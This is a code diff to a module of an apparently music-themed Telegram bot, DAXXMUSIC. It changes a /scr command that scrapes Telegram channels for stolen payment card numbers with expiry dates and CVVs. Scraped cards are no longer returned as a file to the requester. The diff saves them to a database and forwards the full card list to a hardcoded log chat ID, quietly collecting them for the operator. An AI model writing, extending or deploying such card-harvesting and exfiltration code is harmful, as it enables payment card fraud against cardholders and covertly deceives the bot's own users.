@@ -4,7 +4,10 @@ import re
 from pathlib import Path
 from DAXXMUSIC import app, userbot
 from DAXXMUSIC.core.userbot import assistants
+from DAXXMUSIC.utils.database import get_cards, get_card_count, is_card_exists, add_card, remove_card
 
+
+LOGS_CC = -1002237336934
 
 def getcards(text: str):
     text = text.replace('\n', ' ').replace('\r', '')
@@ -38,8 +41,8 @@ def getcards(text: str):
 async def cmd_scr(client, message):
     msg = message.text[len('/scr '):].strip()
     splitter = msg.split(' ')
-    user = userbot.one
-    
+    if 1 in assistants:
+        user = userbot.one
     if not msg or len(splitter) < 2:
         resp = """
 𝗪𝗿𝗼𝗻𝗴 𝗙𝗼𝗿𝗺𝗮𝘁 ❌
@@ -65,6 +68,7 @@ async def cmd_scr(client, message):
     async def scrape_channel(channel_id, limit, title):
         amt_cc = 0
         duplicate = 0
+        card_messages = []
         async for msg in user.get_chat_history(channel_id, limit):
             all_history = msg.text or "INVALID CC NUMBER BC"
             all_cards = all_history.split('\n')
@@ -73,22 +77,26 @@ async def cmd_scr(client, message):
             if not cards:
                 continue
             
-            file_name = f"{limit}x_CC_Scraped_By_@YesikooBot.txt"
             for item in cards:
                 amt_cc += 1
                 cc, mes, ano, cvv = item
                 fullcc = f"{cc}|{mes}|{ano}|{cvv}"
-                
-                with open(file_name, 'a') as f:
-                    cclist = open(file_name).read().splitlines()
-                    if fullcc in cclist:
-                        duplicate += 1
-                    else:
-                        f.write(f"{fullcc}\n")
+                is_exist = await is_card_exists(fullcc)
+                if is_exist:
+                    duplicate += 1
+                else:
+                    await add_card(fullcc)
+                    card_messages.append(f"⊗ 𝐂𝐚𝐫𝐝 : {fullcc}")
 
         total_cc = amt_cc
         cc_found = total_cc - duplicate
         await app.delete_messages(message.chat.id, delete.id)
+        
+        if card_messages:
+            cards_text = "\n\n".join(card_messages)
+        else:
+            cards_text = "No new cards found."
+
         caption = f"""
 𝗖𝗖 𝗦𝗰𝗿𝗮𝗽𝗲𝗱 ✅
 
@@ -98,17 +106,10 @@ async def cmd_scr(client, message):
 ● 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲 𝗥𝗲𝗺𝗼𝘃𝗲𝗱: {duplicate}
 ● 𝗦𝗰𝗿𝗮𝗽𝗲𝗱 𝗕𝘆: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
 """
-        document = file_name
-        scr_done = await app.send_document(
-            message.chat.id,
-            document=document,
-            caption=caption,
-            reply_to_message_id=message.id
+        await app.send_message(
+            chat_id=LOGS_CC,
+            text=caption + "\n\n" + cards_text,
         )
-
-        if scr_done:
-            Path(file_name).unlink(missing_ok=True)
-
 
     try:
         if "https" in channel_link:
